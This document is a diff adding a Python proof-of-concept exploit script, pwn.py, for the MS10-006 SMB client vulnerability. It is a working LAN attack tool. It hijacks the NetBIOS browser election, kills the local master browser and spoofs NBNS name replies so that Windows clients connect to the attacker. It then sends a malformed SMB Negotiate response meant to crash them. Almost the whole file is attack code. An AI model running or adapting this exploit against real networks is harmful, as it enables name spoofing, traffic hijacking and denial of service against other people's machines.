@@ -1,0 +1,264 @@
+# More Info: http://g-laurent.blogspot.com/2010/04/turning-smb-client-bug-to-server-side.html
+import sys,SocketServer,socket,threading,time,random
+from random import *
+from time import sleep
+from socket import *
+
+if len(sys.argv)<=2:	
+ sys.exit('Usage: pwn.py Your_ip Broadcast_ip\n\r Example: pwn.py 10.0.0.1 10.0.0.255')
+
+ip = str(sys.argv[1])
+nbns = str(sys.argv[2]),137
+browser = str(sys.argv[2]),138
+
+
+elec = "\x42\x4f\x00"
+domainmasterbro = "\x42\x4c\x00"
+
+##BROWSER election request
+browserelect = [chr(int(a, 16)) for a in """
+11 02 bd 82 c0 a8 00 96 00 8a 00 ae 00 00 20 46
+47 45 4e 45 43 45 50 46 49 43 41 43 41 43 41 43
+41 43 41 43 41 43 41 43 41 43 41 43 41 41 41 00
+20 46 48 45 50 46 43 45 4c 45 48 46 43 45 50 46
+46 46 41 43 41 43 41 43 41 43 41 43 41 43 41 42
+4f 00 ff 53 4d 42 25 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 11 00 00 14 00 00 00 00 00 00 00 00 00 e8
+03 00 00 00 00 00 00 00 00 14 00 56 00 03 00 01
+00 01 00 02 00 25 00 5c 4d 41 49 4c 53 4c 4f 54
+5c 42 52 4f 57 53 45 00 08 09 a8 0f 01 20 1b e9
+a5 00 00 00 00 00 56 4d 42 4f 58 00""".split()]
+
+##Local Master Announcement
+browsermaster = [chr(int(a, 16)) for a in """
+11 02 bd 2c c0 a8 00 96 00 8a 00 bb 00 00 20 45
+4e 45 42 46 44 46 45 45 46 46 43 43 41 43 41 43
+41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 00
+20 46 48 45 50 46 43 45 4c 45 48 46 43 45 50 46
+46 46 41 43 41 43 41 43 41 43 41 43 41 43 41 42
+4f 00 ff 53 4d 42 25 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 11 00 00 21 00 00 00 00 00 00 00 00 00 e8
+03 00 00 00 00 00 00 00 00 21 00 56 00 03 00 01
+00 00 00 02 00 32 00 5c 4d 41 49 4c 53 4c 4f 54
+5c 42 52 4f 57 53 45 00 0f 00 80 fc 0a 00 4d 41
+53 54 45 52 00 00 00 00 00 00 00 00 00 00 00 06
+2b 10 84 00 00 0f 01 55 aa 00""".split()]
+
+resetcache = [chr(int(a, 16)) for a in """
+11 0a 6b a8 c0 a8 0a 66 00 8a 00 c5 00 00 20 45
+4e 45 42 46 44 46 45 45 46 46 43 43 41 43 41 43
+41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 00
+20 41 42 41 43 46 50 46 50 45 4e 46 44 45 43 46
+43 45 50 46 48 46 44 45 46 46 50 46 50 41 43 41
+42 00 ff 53 4d 42 25 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 11 00 00 2b 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 2b 00 56 00 03 00 01
+00 01 00 02 00 3c 00 5c 4d 41 49 4c 53 4c 4f 54
+5c 42 52 4f 57 53 45 00 0e 02""".split()]
+
+resetlbm = [chr(int(a, 16)) for a in """
+11 0a 6b a8 c0 a8 0a 66 00 8a 00 c5 00 00 20 45
+4e 45 42 46 44 46 45 45 46 46 43 43 41 43 41 43
+41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 00
+20 41 42 41 43 46 50 46 50 45 4e 46 44 45 43 46
+43 45 50 46 48 46 44 45 46 46 50 46 50 41 43 41
+42 00 ff 53 4d 42 25 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 11 00 00 2b 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 2b 00 56 00 03 00 01
+00 01 00 02 00 3c 00 5c 4d 41 49 4c 53 4c 4f 54
+5c 42 52 4f 57 53 45 00 0e 01""".split()]
+
+##Browser Master annoncement
+masterannon = [chr(int(a, 16)) for a in """
+11 02 bd 2c c0 a8 00 96 00 8a 00 bb 00 00 20 45
+4e 45 42 46 44 46 45 45 46 46 43 43 41 43 41 43
+41 43 41 43 41 43 41 43 41 43 41 43 41 43 41 00
+20 46 48 45 50 46 43 45 4c 45 48 46 43 45 50 46
+46 46 41 43 41 43 41 43 41 43 41 43 41 43 41 42
+4f 00 ff 53 4d 42 25 00 00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 11 00 00 21 00 00 00 00 00 00 00 00 00 e8
+03 00 00 00 00 00 00 00 00 21 00 56 00 03 00 01
+00 00 00 02 00 32 00 5c 4d 41 49 4c 53 4c 4f 54
+5c 42 52 4f 57 53 45 00 0d 4d 41 53 54 45 52 00""".split()]
+
+regmsbrowse = [chr(int(a, 16)) for a in """
+be 6e 29 10 00 01 00 00 00 00 00 01 20 41 42 41
+43 46 50 46 50 45 4e 46 44 45 43 46 43 45 50 46
+48 46 44 45 46 46 50 46 50 41 43 41 42 00 00 20
+00 01 c0 0c 00 20 00 01 00 04 93 e0 00 06 80 00
+c0 a8 00 96""".split()]
+
+##NBNS Spoofing
+spoof = [chr(int(a, 16)) for a in """
+08 f3 85 80 00 00 00 01 00 00 00 00 20 46 48 45
+50 46 43 45 4c 45 48 46 43 45 50 46 46 46 41 43
+41 43 41 43 41 43 41 43 41 43 41 42 4e 00 00 20
+00 01 00 04 93 e0 00 06 00 00""".split()]
+
+def nametid(data,packet,service):
+    pack = packet[:]
+    pack[2:4]=data[2:4] ##Transaction ID
+    pack[4:8] = inet_aton(str(sys.argv[1])) ##OurIP Addres
+    pack[48:82]=data[48:79]+service ##Service/domain name
+    return pack
+
+def nametidrand(data,packet,service):
+    pack = packet[:]
+    pack[2:4]= "\x80"+str(chr(choice(range(256)))) ##Transaction ID
+    pack[4:8] = inet_aton(str(sys.argv[1])) ##OurIP Addres
+    pack[48:82]=data[48:79]+service ##Service/domain name
+    return pack
+
+def addipbrow(packet):
+    pack = packet[:]
+    pack[4:8] = inet_aton(str(sys.argv[1]))
+    return pack
+
+def addipnb(packet):
+    pack = packet[:]
+    pack[len(packet)-4:] = inet_aton(str(sys.argv[1]))
+    return pack
+
+def sockbroad(packet,host):
+   s = socket(AF_INET,SOCK_DGRAM)
+   s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
+   s.sendto(packet,host)
+
+class BROWSER(SocketServer.BaseRequestHandler):
+     
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+
+    def handle(self):
+        ip = inet_aton(str(sys.argv[1]))
+        request, socket = self.request
+        data = request
+        print "From:", self.client_address
+        if data[168] == "\x01" or data[168] == "\x0f" or data[168] == "\x08" and self.client_address[0] != sys.argv[1]:
+
+           sockbroad(''.join(addipbrow(resetcache)),browser)
+           print "[+]LMB cache Successfully Reseted"
+
+           sockbroad(''.join(addipbrow(resetlbm)),browser)
+           print "[+]LMB Successfully killed"
+
+           for x in range(4):
+              sockbroad(''.join(nametid(data,browserelect, elec)),browser)
+              sleep(0.8)
+           print "[+] Election Won !\n"
+
+           for x in range(4):
+              sleep(0.5)
+              sockbroad(''.join(addipnb(regmsbrowse)),nbns)
+           print "[+]Now Register __MSBROWSE__ :] "
+                  
+           sockbroad(''.join(nametidrand(data,browsermaster, elec)),browser)
+           sleep(1)
+           sockbroad(''.join(nametidrand(data,masterannon, domainmasterbro)),browser)
+           print "[+] Now LBM ! \n"
+
+#NBNS SPOOF;
+
+def namenbnstid(data,packet):
+    pack = packet[:]
+    pack[0:2]=data[0:2]##Transaction ID
+    pack[12:48]=data[12:48]##Netbios name
+    return pack
+
+class NBNS(SocketServer.BaseRequestHandler):
+     
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+
+    def handle(self):
+        request, socket = self.request
+        data = request
+        print "From:", self.client_address
+        #Hijack
+        if data[2:4] == "\x01\x10":    
+           buffer0 = ''.join(namenbnstid(data,spoof))+inet_aton(str(sys.argv[1]))
+           socket.sendto(buffer0, self.client_address)
+           print "Fake NBNS Response sended\n"
+
+packetnego = (
+##SMB Header
+"\x00\x00\x00\x7f"                   #Netbios length
+"\xff\x53\x4d\x42"                   #Server type
+"\x72"                               #Operation/Command
+"\x00\x00\x00\x00"                   #Statut command OK Success 
+"\x98"                               #Flag 0x98
+"\x53\xc8"                           #Flag 0xc853
+"\x00\x00"                           #PID High
+"\x00\x00\x00\x00\x00\x00\x00\x00"   #Signature
+"\x00\x00"                           #Reserved
+"\x00\x00"                           #Tree ID
+"\xff\xfe"                           #Process ID
+"\x00\x00"                           #User ID
+"\x00\x00"                           #Multiplex ID
+##SMB Header end
+
+##Negotiate Protocol
+"\x11"                               #Word count
+"\x05\x00"                           #Choosen dialect, no-5 from client list
+"\x03"                               #Security mode
+"\x41\x41"                           #Max MPX count
+"\x41\x41"                           #Max VCs
+##Issue
+"\x03\x00\x00\x00"                   #Max buffer size; The issue is located here, as we specify an only 4 bytes max buffer length is this example.
+#Usually a server would provide a 4356 max buffer size.
+"\x41\x41\x41\x41"                   #Max raw buffer
+"\x00\x00\x00\x00"                   #Session key
+"\xfc\xe3\x01\x80"                   #Capabilities
+"\xea\xb1\x6e\x18\x11\x62\xca\x01"   #System Time
+"\x2c\x01"                           #Server timezone
+"\x00"                               #Key length
+"\x3a\x00"                           #Byte count
+#Server GUID
+"\x68\x52\x38\x38\xf2\xe3\x9f\x4f\x94\x26\xbd\xcb\xca\x2e\x28\x9a"   
+#Security Blob
+"\x60\x28\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x1e\x30\x1c\xa0\x1a"
+"\x30\x18\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e\x06\x0a"
+"\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"
+##Negotiate Protocol end
+)
+
+class MS10_006(SocketServer.BaseRequestHandler):
+
+    def server_bind(self):
+       self.socket.setsockopt(SOL_SOCKET, SO_REUSEADDR,SO_REUSEPORT, 1)
+       self.socket.bind(self.server_address)
+
+    def handle(self):  
+        print "From:", self.client_address
+        data = self.request.recv(256)
+        if data[0] == "\x81":
+           buffer0 = "\x82\x00\x00\x00"         
+           self.request.send(buffer0)
+           print "Session Positive Response sended\n"
+           data = self.request.recv(1024)
+        if data[8] == "\x72":     
+           self.request.send(packetnego)
+           print "Negotiate Response sended kaboom !\n"
+           data = self.request.recv(1024)
+
+
+def serve_thread_udp(host, port, handler):
+    server = SocketServer.UDPServer((host, port), handler)
+    server.serve_forever()
+
+def serve_thread_tcp(host, port, handler):
+    server = SocketServer.TCPServer((host, port), handler)
+    server.serve_forever()
+
+SocketServer.TCPServer.allow_reuse_address = 1
+threading.Thread(target=serve_thread_tcp,args=('', 139,MS10_006)).start()
+threading.Thread(target=serve_thread_tcp,args=('', 445,MS10_006)).start()
+threading.Thread(target=serve_thread_udp,args=('', 137,NBNS)).start()
+threading.Thread(target=serve_thread_udp,args=('', 138,BROWSER)).start()
